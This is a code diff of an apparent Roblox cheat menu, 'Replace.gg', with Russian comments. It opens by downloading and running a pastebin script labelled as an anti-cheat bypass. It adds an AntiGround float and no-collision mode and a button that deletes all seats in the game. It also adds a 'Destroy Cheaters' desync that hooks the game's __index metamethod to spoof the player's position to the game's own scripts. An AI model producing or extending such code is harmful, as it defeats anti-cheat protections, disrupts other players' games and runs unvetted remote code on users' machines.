@@ -1,3 +1,4 @@
+wait(3)
 loadstring(game:HttpGet('https://pastebin.com/raw/gimbTwW1'))()
 -- ac bypass, dont touch
 local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/ZXCdswqezxc/libtests/refs/heads/main/library"))()
@@ -202,10 +203,295 @@ local tabs = {
     Config = win:tab{name = "Config"}
 }
 
+-- Добавляем секции в Movement вкладку
+local movement_sections = {
+    main = tabs.Movement:section{name = "Main", side = "left"},
+    extra = tabs.Movement:section{name = "Extra", side = "right"}
+}
+
+-- AntiGround функционал
+getgenv().antigroundtoggle = false -- По умолчанию выключено
+getgenv().yoffset = 5 -- Минимальная высота над землёй (в studs)
+
+-- Создаем переменные для AntiGround
+local antiGround = {
+    Enabled = false,
+    Connection = nil,
+    CharConnection = nil,
+    LastCheck = 0,
+    CheckFrequency = 0.02 -- 50 раз в секунду вместо каждого кадра
+}
+
+-- Функция для настройки AntiGround
+local function setupAntiGround()
+    local Players = game:GetService("Players")
+    local RunService = game:GetService("RunService")
+    local LocalPlayer = Players.LocalPlayer
+
+    local RAYCAST_DISTANCE = 50 -- Максимальная длина луча для поиска земли
+    local RAYCAST_PARAMS = RaycastParams.new()
+    RAYCAST_PARAMS.FilterType = Enum.RaycastFilterType.Blacklist
+    
+    if LocalPlayer.Character then
+        RAYCAST_PARAMS.FilterDescendantsInstances = {LocalPlayer.Character}
+    end
+
+    -- Функция для получения позиции над землёй
+    local function getGroundPosition()
+        if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            return nil
+        end
+
+        local rootPart = LocalPlayer.Character.HumanoidRootPart
+        local origin = rootPart.Position
+        local direction = Vector3.new(0, -RAYCAST_DISTANCE, 0)
+        local raycastResult = workspace:Raycast(origin, direction, RAYCAST_PARAMS)
+
+        if raycastResult then
+            return raycastResult.Position + Vector3.new(0, getgenv().yoffset, 0)
+        end
+        return nil
+    end
+
+    -- Отключение коллизии персонажа
+    local function disableCollisions()
+        if LocalPlayer.Character then
+            for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
+                if part:IsA("BasePart") then
+                    part.CanCollide = false
+                end
+            end
+        end
+    end
+
+    -- Очистка скриптов
+    if LocalPlayer.Character then
+        for _, v in pairs(LocalPlayer.Character:GetChildren()) do
+            if v:IsA("Script") and v.Name ~= "Health" and v.Name ~= "Sound" and v:FindFirstChild("LocalScript") then
+                v:Destroy()
+            end
+        end
+        disableCollisions()
+    end
+
+    -- Отключаем предыдущее соединение CharacterAdded, если оно существует
+    if antiGround.CharConnection and antiGround.CharConnection.Connected then
+        antiGround.CharConnection:Disconnect()
+        antiGround.CharConnection = nil
+    end
+
+    -- Обработка появления нового персонажа
+    antiGround.CharConnection = LocalPlayer.CharacterAdded:Connect(function(char)
+        repeat
+            task.wait()
+        until LocalPlayer.Character
+        
+        RAYCAST_PARAMS.FilterDescendantsInstances = {char}
+        
+        local humanoid = char:WaitForChild("Humanoid")
+        char:WaitForChild("HumanoidRootPart")
+        
+        disableCollisions()
+        
+        char.ChildAdded:Connect(function(child)
+            if child:IsA("Script") then 
+                task.wait(0.1)
+                if child:FindFirstChild("LocalScript") then
+                    child.LocalScript:FireServer()
+                end
+            end
+        end)
+    end)
+
+    -- Отключаем предыдущее соединение Heartbeat, если оно существует
+    if antiGround.Connection and antiGround.Connection.Connected then
+        antiGround.Connection:Disconnect()
+        antiGround.Connection = nil
+    end
+
+    -- Сохраняем последнюю позицию для плавности
+    local lastPosition = nil
+    local lastGroundY = nil
+    
+    -- Основной цикл обновления с ограничением частоты
+    antiGround.Connection = RunService.Heartbeat:Connect(function(deltaTime)
+        -- Проверяем, включен ли AntiGround
+        if not getgenv().antigroundtoggle then return end
+        
+        -- Ограничиваем частоту обновлений для снижения нагрузки
+        local currentTime = tick()
+        if currentTime - antiGround.LastCheck < antiGround.CheckFrequency then
+            return
+        end
+        antiGround.LastCheck = currentTime
+        
+        if LocalPlayer.Character and 
+           LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and 
+           LocalPlayer.Character:FindFirstChild("Humanoid") then
+            
+            local humanoid = LocalPlayer.Character.Humanoid
+            local rootPart = LocalPlayer.Character.HumanoidRootPart
+            local groundPosition = getGroundPosition()
+
+            if groundPosition then
+                -- Устанавливаем состояние "бег" для анимаций ходьбы
+                if humanoid.MoveDirection.Magnitude > 0 then
+                    humanoid:ChangeState(Enum.HumanoidStateType.Running)
+                else
+                    humanoid:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)
+                end
+
+                -- Получаем текущую позицию и направление
+                local currentCFrame = rootPart.CFrame
+                local moveDirection = humanoid.MoveDirection * 0.3 -- Скорость ~17 Velocity
+
+                -- Стабилизация Y-позиции для предотвращения тряски
+                local targetY = groundPosition.Y
+                local currentY = currentCFrame.Y
+                local newY = currentY
+                
+                -- Инициализируем lastGroundY при первом запуске
+                if not lastGroundY then
+                    lastGroundY = targetY
+                end
+                
+                -- Сглаживание изменений высоты земли для предотвращения тряски
+                lastGroundY = lastGroundY + (targetY - lastGroundY) * 0.1
+                
+                -- Плавная интерполяция высоты
+                if currentY < lastGroundY then
+                    -- Быстрее поднимаемся, если под нами земля
+                    newY = currentY + (lastGroundY - currentY) * 0.2
+                elseif currentY > lastGroundY + 0.5 then
+                    -- Медленнее опускаемся, если мы выше земли
+                    newY = currentY - (currentY - lastGroundY) * 0.05
+                else
+                    -- Стабилизируем на нужной высоте
+                    newY = lastGroundY
+                end
+
+                -- Новая позиция с плавным движением
+                local newPosition = Vector3.new(
+                    currentCFrame.X + moveDirection.X,
+                    newY,
+                    currentCFrame.Z + moveDirection.Z
+                )
+
+                -- Сохраняем последнюю позицию для дополнительной плавности
+                if not lastPosition then
+                    lastPosition = newPosition
+                else
+                    -- Дополнительное сглаживание позиции
+                    newPosition = Vector3.new(
+                        lastPosition.X + (newPosition.X - lastPosition.X) * 0.7,
+                        newPosition.Y,
+                        lastPosition.Z + (newPosition.Z - lastPosition.Z) * 0.7
+                    )
+                    lastPosition = newPosition
+                end
+
+                -- Применяем CFrame, сохраняя ориентацию
+                rootPart.CFrame = CFrame.new(newPosition) * CFrame.Angles(currentCFrame:ToEulerAnglesXYZ())
+
+                -- Отключаем гравитацию и стабилизируем скорость
+                rootPart.Velocity = Vector3.new(
+                    rootPart.Velocity.X * 0.8, 
+                    0, 
+                    rootPart.Velocity.Z * 0.8
+                )
+            end
+        end
+    end)
+end
+
+-- Добавляем toggle для AntiGround
+movement_sections.main:toggle{
+    name = "AntiGround",
+    flag = "antiground_enabled",
+    default = false,
+    callback = function(state)
+        getgenv().antigroundtoggle = state
+        antiGround.Enabled = state
+        
+        if state then
+            setupAntiGround()
+            library:notification{
+                text = "AntiGround enabled",
+                time = 3
+            }
+        else
+            -- Отключаем соединения при выключении
+            if antiGround.Connection and antiGround.Connection.Connected then
+                antiGround.Connection:Disconnect()
+                antiGround.Connection = nil
+            end
+            
+            if antiGround.CharConnection and antiGround.CharConnection.Connected then
+                antiGround.CharConnection:Disconnect()
+                antiGround.CharConnection = nil
+            end
+            
+            library:notification{
+                text = "AntiGround disabled",
+                time = 3
+            }
+        end
+    end
+}
+
+-- Добавляем слайдер для настройки высоты над землей
+movement_sections.main:slider{
+    name = "Ground Distance",
+    flag = "ground_distance",
+    min = 5,
+    max = 20,
+    default = 5,
+    increment = 0.5,
+    callback = function(value)
+        getgenv().yoffset = value
+        library:notification{
+            text = "Ground distance set to " .. value,
+            time = 3
+        }
+    end
+}
+
 -- Добавляем секции в Misc вкладку
 local misc_sections = {
     camera = tabs.Misc:section{name = "Camera", side = "left"},
     extras = tabs.Misc:section{name = "Extras", side = "right"}
+}
+
+-- Функция для удаления всех сидений в игре
+local function removeAllSeats()
+    local removedCount = 0
+    
+    -- Проверяем все объекты в рабочем пространстве
+    for _, obj in pairs(game:GetDescendants()) do
+        -- Ищем объекты типа Seat, VehicleSeat, и т.д.
+        if obj:IsA("Seat") or obj:IsA("VehicleSeat") or obj:IsA("Platform") or 
+           (obj:IsA("Part") and obj.Name:lower():find("seat")) then
+            pcall(function()
+                obj.Parent = nil -- Удаляем объект из иерархии
+                removedCount = removedCount + 1
+            end)
+        end
+    end
+    
+    -- Возвращаем количество удаленных объектов
+    return removedCount
+end
+
+-- Добавляем кнопку для удаления сидений
+misc_sections.extras:button{
+    name = "Remove All Seats",
+    callback = function()
+        local count = removeAllSeats()
+        library:notification{
+            text = "Removed " .. count .. " seats from the game",
+            time = 3
+        }
+    end
 }
 
 -- Anti-AFK переменная и логика
@@ -230,9 +516,16 @@ misc_sections.camera:toggle{
     callback = function(state)
         if state then
             game.Players.LocalPlayer.CameraMaxZoomDistance = math.huge
+            library:notification{
+                text = "Infinity Zoom enabled",
+                time = 3
+            }
         else
-            -- Возвращаем стандартное значение при отключении
             game.Players.LocalPlayer.CameraMaxZoomDistance = 128
+            library:notification{
+                text = "Infinity Zoom disabled",
+                time = 3
+            }
         end
     end
 }
@@ -244,6 +537,17 @@ misc_sections.extras:toggle{
     default = false,
     callback = function(state)
         antiAFK.Enabled = state
+        if state then
+            library:notification{
+                text = "Anti-AFK enabled",
+                time = 3
+            }
+        else
+            library:notification{
+                text = "Anti-AFK disabled",
+                time = 3
+            }
+        end
     end
 }
 
@@ -272,17 +576,38 @@ misc_sections.extras:toggle{
         disableShadows.Enabled = state
         if state then
             remove_shadows()
+            -- Останавливаем предыдущий поток, если он существует
+            if disableShadows.Thread then
+                task.cancel(disableShadows.Thread)
+                disableShadows.Thread = nil
+            end
+            
             disableShadows.Thread = task.spawn(function()
                 while disableShadows.Enabled do
                     task.wait(5)
+                    -- Дополнительная проверка на случай, если toggle был выключен
+                    if not disableShadows.Enabled then break end
                     remove_shadows()
                 end
             end)
+            library:notification{
+                text = "Shadows disabled",
+                time = 3
+            }
         else
+            -- Останавливаем поток
+            if disableShadows.Thread then
+                task.cancel(disableShadows.Thread)
+                disableShadows.Thread = nil
+            end
+            
             disableShadows.Enabled = false
-            -- Возвращаем тени обратно
             local lighting = game:GetService("Lighting")
             lighting.GlobalShadows = true
+            library:notification{
+                text = "Shadows enabled",
+                time = 3
+            }
         end
     end
 }
@@ -328,6 +653,17 @@ misc_sections.extras:toggle{
     default = false,
     callback = function(state)
         noJumpCD.Enabled = state
+        if state then
+            library:notification{
+                text = "NoJumpCD enabled",
+                time = 3
+            }
+        else
+            library:notification{
+                text = "NoJumpCD disabled",
+                time = 3
+            }
+        end
     end
 }
 
@@ -337,6 +673,17 @@ misc_sections.extras:toggle{
     default = false,
     callback = function(state)
         noRecoil.Enabled = state
+        if state then
+            library:notification{
+                text = "NoRecoil enabled",
+                time = 3
+            }
+        else
+            library:notification{
+                text = "NoRecoil disabled",
+                time = 3
+            }
+        end
     end
 }
 
@@ -348,21 +695,6 @@ local antiFling = {
     Players = {}, -- Кэш для отслеживаемых игроков
     CheckFrequency = 0.1 -- Проверять 10 раз в секунду вместо каждого кадра
 }
-
--- Функция для создания уведомления
-local function showNotification(text, color)
-    library:notification{
-        text = text,
-        time = 3
-    }
-    -- Также отправляем в чат, если возможно
-    pcall(function()
-        game.StarterGui:SetCore("ChatMakeSystemMessage", {
-            Text = text,
-            Color = color or Color3.fromRGB(255, 200, 0)
-        })
-    end)
-end
 
 misc_sections.extras:toggle{
     name = "Anti-Fling",
@@ -459,7 +791,17 @@ misc_sections.extras:toggle{
                         -- Проверяем скорость
                         if data.PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 or data.PrimaryPart.AssemblyLinearVelocity.Magnitude > 100 then
                             if not data.Detected then
-                                showNotification("Fling Exploit detected, Player: " .. tostring(player), Color3.fromRGB(255, 200, 0))
+                                library:notification{
+                                    text = "Fling Exploit detected, Player: " .. tostring(player),
+                                    time = 3
+                                }
+                                -- Также отправляем в чат, если возможно
+                                pcall(function()
+                                    game.StarterGui:SetCore("ChatMakeSystemMessage", {
+                                        Text = "Fling Exploit detected, Player: " .. tostring(player),
+                                        Color = Color3.fromRGB(255, 200, 0)
+                                    })
+                                end)
                                 data.Detected = true
                             end
                             
@@ -490,7 +832,17 @@ misc_sections.extras:toggle{
                                     primaryPart.CFrame = antiFling.LastPosition
                                 end
                                 
-                                showNotification("Fling attempt detected! Neutralizing velocity.", Color3.fromRGB(255, 0, 0))
+                                library:notification{
+                                    text = "Fling attempt detected! Neutralizing velocity.",
+                                    time = 3
+                                }
+                                -- Также отправляем в чат, если возможно
+                                pcall(function()
+                                    game.StarterGui:SetCore("ChatMakeSystemMessage", {
+                                        Text = "Fling attempt detected! Neutralizing velocity.",
+                                        Color = Color3.fromRGB(255, 0, 0)
+                                    })
+                                end)
                             elseif primaryPart.AssemblyLinearVelocity.Magnitude < 50 then
                                 antiFling.LastPosition = primaryPart.CFrame
                             end
@@ -501,7 +853,10 @@ misc_sections.extras:toggle{
             
             table.insert(antiFling.Connections, mainHeartbeatConnection)
             
-            showNotification("Anti-Fling enabled", Color3.fromRGB(0, 255, 0))
+            library:notification{
+                text = "Anti-Fling enabled",
+                time = 3
+            }
         else
             -- Отключаем все соединения
             for _, connection in pairs(antiFling.Connections) do
@@ -513,7 +868,148 @@ misc_sections.extras:toggle{
             antiFling.Players = {}
             antiFling.LastPosition = nil
             
-            showNotification("Anti-Fling disabled", Color3.fromRGB(255, 0, 0))
+            library:notification{
+                text = "Anti-Fling disabled",
+                time = 3
+            }
+        end
+    end
+}
+
+-- Destroy Cheaters (Finobe)
+getgenv().Finobe1 = false
+local destroyCheaters = {
+    Enabled = false, -- мастер-тумблер
+    Active = false,  -- активность (переключается кейбиндом)
+    Finobe2 = nil,
+    Connections = {},
+    HookFunction = nil
+}
+
+local LocalFinobe = game:GetService("Players").LocalPlayer
+local Runfinobe = game:GetService("RunService")
+local InputService = game:GetService("UserInputService")
+local NewCFrame = CFrame.new
+
+-- Отключаем все соединения Destroy Cheaters
+local function disconnectDestroyCheaters()
+    for _, connection in pairs(destroyCheaters.Connections) do
+        if connection and connection.Connected then
+            connection:Disconnect()
+        end
+    end
+    destroyCheaters.Connections = {}
+end
+
+-- Heartbeat цикл
+local heartbeatConn = Runfinobe.Heartbeat:Connect(function()
+    if not destroyCheaters.Enabled or not destroyCheaters.Active then return end
+    if LocalFinobe.Character and LocalFinobe.Character:FindFirstChild("HumanoidRootPart") then
+        local FinobeChar = LocalFinobe.Character.HumanoidRootPart
+        local Offset = FinobeChar.CFrame * NewCFrame(9e9, 0/0, math.huge)
+        destroyCheaters.Finobe2 = FinobeChar.CFrame
+        FinobeChar.CFrame = Offset
+        Runfinobe.RenderStepped:Wait()
+        FinobeChar.CFrame = destroyCheaters.Finobe2
+    end
+end)
+table.insert(destroyCheaters.Connections, heartbeatConn)
+
+-- Хук для маскировки
+if not destroyCheaters.HookFunction then
+    local oldHook
+    oldHook = hookmetamethod(game, "__index", newcclosure(function(self, key)
+        if not checkcaller() then
+            if key == "CFrame" and destroyCheaters.Enabled and destroyCheaters.Active and LocalFinobe.Character and LocalFinobe.Character:FindFirstChild("HumanoidRootPart") and LocalFinobe.Character:FindFirstChild("Humanoid") and LocalFinobe.Character:FindFirstChild("Humanoid").Health > 0 then
+                if self == LocalFinobe.Character.HumanoidRootPart and destroyCheaters.Finobe2 ~= nil then
+                    return destroyCheaters.Finobe2
+                end
+            end
+        end
+        return oldHook(self, key)
+    end))
+    destroyCheaters.HookFunction = oldHook
+end
+
+-- Toggle Destroy Cheaters (мастер-тумблер)
+local destroyCheaterToggle = misc_sections.extras:toggle{
+    name = "Destroy Cheaters",
+    flag = "destroy_cheaters",
+    default = false,
+    callback = function(state)
+        destroyCheaters.Enabled = state
+        if not state then
+            destroyCheaters.Active = false
+            getgenv().Finobe1 = false
+            
+            -- Отключаем все соединения для экономии ресурсов
+            disconnectDestroyCheaters()
+            
+            if destroyCheaters.Finobe2 and LocalFinobe.Character and LocalFinobe.Character:FindFirstChild("HumanoidRootPart") then
+                pcall(function()
+                    LocalFinobe.Character.HumanoidRootPart.CFrame = destroyCheaters.Finobe2
+                end)
+            end
+            library:notification{
+                text = "Destroy Cheaters disabled",
+                time = 3
+            }
+        else
+            -- Пересоздаем соединения
+            disconnectDestroyCheaters()
+            
+            local heartbeatConn = Runfinobe.Heartbeat:Connect(function()
+                if not destroyCheaters.Enabled or not destroyCheaters.Active then return end
+                if LocalFinobe.Character and LocalFinobe.Character:FindFirstChild("HumanoidRootPart") then
+                    local FinobeChar = LocalFinobe.Character.HumanoidRootPart
+                    local Offset = FinobeChar.CFrame * NewCFrame(9e9, 0/0, math.huge)
+                    destroyCheaters.Finobe2 = FinobeChar.CFrame
+                    FinobeChar.CFrame = Offset
+                    Runfinobe.RenderStepped:Wait()
+                    FinobeChar.CFrame = destroyCheaters.Finobe2
+                end
+            end)
+            table.insert(destroyCheaters.Connections, heartbeatConn)
+            
+            library:notification{
+                text = "Destroy Cheaters enabled",
+                time = 3
+            }
+        end
+    end
+}
+
+-- Keybind для Destroy Cheaters (работает только если тумблер включён)
+misc_sections.extras:keybind{
+    name = "Destroy Cheaters Key",
+    flag = "destroy_cheaters_key",
+    default = Enum.KeyCode.X,
+    mode = "toggle",
+    callback = function()
+        if not destroyCheaters.Enabled then
+            library:notification{
+                text = "Enable Destroy Cheaters first!",
+                time = 3
+            }
+            return
+        end
+        destroyCheaters.Active = not destroyCheaters.Active
+        getgenv().Finobe1 = destroyCheaters.Active
+        if destroyCheaters.Active then
+            library:notification{
+                text = "Destroy Cheaters: ACTIVE",
+                time = 3
+            }
+        else
+            if destroyCheaters.Finobe2 and LocalFinobe.Character and LocalFinobe.Character:FindFirstChild("HumanoidRootPart") then
+                pcall(function()
+                    LocalFinobe.Character.HumanoidRootPart.CFrame = destroyCheaters.Finobe2
+                end)
+            end
+            library:notification{
+                text = "Destroy Cheaters: INACTIVE",
+                time = 3
+            }
         end
     end
 }
@@ -638,8 +1134,18 @@ config_sections.menu:toggle{
     flag = "watermark_enabled",
     default = false, -- По умолчанию выключено
     callback = function(state)
-        -- Используем нашу собственную функцию
         watermark.toggle(state)
+        if state then
+            library:notification{
+                text = "Watermark enabled",
+                time = 3
+            }
+        else
+            library:notification{
+                text = "Watermark disabled",
+                time = 3
+            }
+        end
     end
 }
 
@@ -654,7 +1160,8 @@ config_sections.menu:keybind{
 }
 
 -- Создаем обработчик для клавиши переключения меню
-library:connection(game:GetService("UserInputService").InputBegan, function(input, gameProcessed)
+local menuToggleConnection = nil
+menuToggleConnection = library:connection(game:GetService("UserInputService").InputBegan, function(input, gameProcessed)
     if gameProcessed then return end
     
     local menu_key = library.flags["menu_toggle_key"]
@@ -664,8 +1171,40 @@ library:connection(game:GetService("UserInputService").InputBegan, function(inpu
     end
 end)
 
+-- Функция для очистки ресурсов при выходе из игры
+game:GetService("Players").LocalPlayer.OnTeleport:Connect(function()
+    -- Отключаем все соединения
+    if menuToggleConnection and menuToggleConnection.Connected then
+        menuToggleConnection:Disconnect()
+    end
+    
+    -- Отключаем все функции
+    antiAFK.Enabled = false
+    disableShadows.Enabled = false
+    if disableShadows.Thread then
+        task.cancel(disableShadows.Thread)
+        disableShadows.Thread = nil
+    end
+    
+    noJumpCD.Enabled = false
+    noRecoil.Enabled = false
+    
+    antiFling.Enabled = false
+    for _, connection in pairs(antiFling.Connections) do
+        if connection and connection.Connected then
+            connection:Disconnect()
+        end
+    end
+    antiFling.Connections = {}
+    
+    destroyCheaters.Enabled = false
+    destroyCheaters.Active = false
+    getgenv().Finobe1 = false
+    disconnectDestroyCheaters()
+end)
+
 -- Отображаем уведомление о загрузке скрипта
 library:notification{
-    text = "Script successfully loaded!",
+    text = "Replace.gg loaded",
     time = 3
 }
